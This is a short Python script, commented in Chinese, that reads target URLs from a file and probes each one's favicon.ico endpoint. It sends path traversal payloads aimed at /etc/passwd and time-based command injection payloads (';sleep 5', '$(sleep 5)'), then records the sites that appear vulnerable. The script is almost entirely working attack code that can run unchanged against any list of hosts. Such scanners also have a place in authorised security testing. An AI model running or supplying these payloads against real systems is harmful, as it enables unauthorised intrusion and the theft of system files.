import requests
import time
from urllib.parse import urljoin

# 配置项
PAYLOADS = {
    "path_traversal": [
        "/favicon.ico?text=../../../../etc/passwd%00",
        "/favicon.ico?file=....//....//etc/passwd"
    ],
    "command_injection": [
        "/favicon.ico?size=100x100;sleep 5",
        "/favicon.ico?color=$(sleep 5)"
    ]
}

PATH_TRAVERSAL_KEYWORDS = ["root:", "daemon:", "/bin/bash"]
TIMEOUT = 10
DELAY_THRESHOLD = 4  # 超过此秒数认为可能存在命令注入

def test_vulnerability(url, payload, vuln_type):
    try:
        target_url = urljoin(url, payload)
        
        if vuln_type == "path_traversal":
            response = requests.get(target_url, timeout=TIMEOUT)
            if response.status_code == 200:
                content = response.text.lower()
                if any(keyword in content for keyword in PATH_TRAVERSAL_KEYWORDS):
                    return True, f"Found path traversal via {payload}"
        
        elif vuln_type == "command_injection":
            start_time = time.time()
            requests.get(target_url, timeout=TIMEOUT)
            elapsed_time = time.time() - start_time
            if elapsed_time >= DELAY_THRESHOLD:
                return True, f"Possible command injection (delay {elapsed_time:.2f}s) via {payload}"
            
        return False, ""
    
    except Exception as e:
        return False, f"Error: {str(e)}"

def main():
    with open("url.txt", "r") as f:
        urls = [line.strip() for line in f.readlines() if line.strip()]

    results = []

    for url in urls:
        print(f"Testing {url}...")
        
        # 测试路径遍历
        for payload in PAYLOADS["path_traversal"]:
            success, msg = test_vulnerability(url, payload, "path_traversal")
            if success:
                results.append(f"[VULNERABLE] {url} - {msg}")
                print(f"Found vulnerability: {msg}")
                break  # 发现漏洞后停止当前类型的测试
        
        # 测试命令注入
        for payload in PAYLOADS["command_injection"]:
            success, msg = test_vulnerability(url, payload, "command_injection")
            if success:
                results.append(f"[VULNERABLE] {url} - {msg}")
                print(f"Found vulnerability: {msg}")
                break

    # 保存结果
    with open("output.txt", "w") as f:
        f.write("\n".join(results))

    print(f"Scan completed. Results saved to output.txt ({len(results)} findings)")

if __name__ == "__main__":
    main()
